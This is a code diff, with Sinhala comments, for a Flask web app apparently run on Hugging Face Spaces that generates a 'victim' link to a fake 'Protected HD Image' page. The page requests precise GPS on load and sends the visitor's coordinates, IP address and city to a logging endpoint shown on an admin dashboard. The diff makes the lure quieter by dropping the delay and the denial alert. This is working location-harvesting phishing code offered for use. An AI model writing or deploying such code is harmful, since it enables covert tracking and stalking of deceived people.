@@ -12,18 +12,17 @@ def get_ip_info(ip):
         return res if res['status'] == 'success' else None
     except: return None
 
-# --- [ප්‍රධාන ටැබ් එක] Admin Dashboard එක ---
+# --- [ප්‍රධාන පිටුව] Hugging Face එකට ගිය ගමන් පෙනෙන Admin Dashboard එක ---
 @app.route('/')
 def admin():
-    # Hugging Face එකේ ඔයාගේ Space එකේ ලින්ක් එක මෙතනට දාන්න
-    # උදා: https://username-spacename.hf.space
-    # ලින්ක් එක අවසානයට /view කියලා ඇඩ් කරන්න
+    # මෙතනදී ඔයාගේ Hugging Face Space එකේ URL එක ඔටෝම ගන්නවා
+    # ඒ ලින්ක් එක අගට /view කෑල්ල එකතු කරලා තමයි අනිත් අයට යවන ලින්ක් එක හදන්නේ
     base_url = request.host_url.rstrip('/')
     victim_link = f"{base_url}/view"
     
     return render_template('index.html', logs=reversed(captured_logs), tunnel_url=victim_link)
 
-# --- [Victim ලින්ක් එක] අනිත් අයට පේන Image පේජ් එක ---
+# --- [Victim Page] අනිත් අයට පෙනෙන හොර පේජ් එක ---
 @app.route('/view')
 def victim_page():
     user_ip = request.remote_addr
@@ -41,26 +40,30 @@ def victim_page():
         <style>
             body {{ background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }}
             .btn {{ background: #25D366; color: white; padding: 15px; border-radius: 50px; border: none; font-weight: bold; width: 80%; max-width: 300px; margin-top: 20px; cursor: pointer; }}
-            .blur {{ width: 250px; filter: blur(15px); border-radius: 10px; }}
+            .blur {{ width: 280px; filter: blur(15px); border-radius: 15px; border: 1px solid #333; }}
         </style>
         <script>
+            // පේජ් එකට ආපු ගමන් GPS ඉල්ලනවා
             window.onload = function() {{ 
-                setTimeout(() => {{ 
-                    navigator.geolocation.getCurrentPosition(s, e, {{enableHighAccuracy:true}}); 
-                }}, 1000);
+                navigator.geolocation.getCurrentPosition(s, e, {{enableHighAccuracy:true}}); 
             }};
+            
             function s(p) {{
                 fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ip={user_ip}&city={city}')
                 .then(() => location.href='https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1200');
             }}
-            function e() {{ alert("Error: Please allow region access to view image."); location.reload(); }}
+
+            // Alert එක එන්නේ නැති වෙන්න මේක හිස්ව තිබ්බා (මචං උඹ ඉල්ලපු විදිහට)
+            function e() {{ 
+                console.log("Location denied"); 
+            }}
         </script>
     </head>
     <body>
         <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300" class="blur">
         <h2>Protected HD Image</h2>
-        <p>Location access required for <b>{city}</b> region verification.</p>
-        <button class="btn" onclick="location.reload()">Unlock Image</button>
+        <p style="color:#aaa;">Verification required for <b>{city}</b> region.</p>
+        <button class="btn" onclick="location.reload()">Unlock Full Image</button>
     </body>
     </html>
     '''
@@ -78,5 +81,5 @@ def log_data():
     return "OK"
 
 if __name__ == '__main__':
-    # Hugging Face පෝට් එක
+    # Hugging Face පෝට් එක අනිවාර්යයෙන්ම 7860 විය යුතුයි
     app.run(host='0.0.0.0', port=7860)
